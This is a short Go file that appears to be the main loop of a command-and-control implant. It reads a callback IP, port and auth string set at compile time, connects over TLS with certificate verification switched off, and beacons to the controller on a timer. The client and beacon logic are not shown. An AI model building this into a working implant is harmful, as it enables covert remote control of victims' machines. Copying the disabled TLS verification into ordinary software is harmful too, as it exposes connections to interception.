package main

import (
	"crypto/tls"
	"fmt"
	"time"
)

// Values are required, but are basically throw-away values unless security verification is enabled
var certString string = `[CERT]`
var keyString string = `[PRIVATE-KEY]`

// Values to be set at compile time
var (
	EndpointID string = ""
	IpAddr     string = "127.0.0.1"
	Port       string = "8043"
	AuthString string
)

func main() {
	fmt.Printf("%s %s %s %s", EndpointID, IpAddr, Port, AuthString)
	c := newClient()

	// Setup TLS
	var cert tls.Certificate
	cert.Certificate = append(cert.Certificate, []byte(certString))
	cert.PrivateKey = []byte(keyString)
	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}

	for {
		var err error
		c.conn, err = tls.Dial("tcp", IpAddr+":"+Port, &config)
		if err != nil {
			println(err.Error() + "\n")
			return
		}

		c.beacon()
		time.Sleep(time.Duration(c.beaconRate) * time.Second)
	}
}
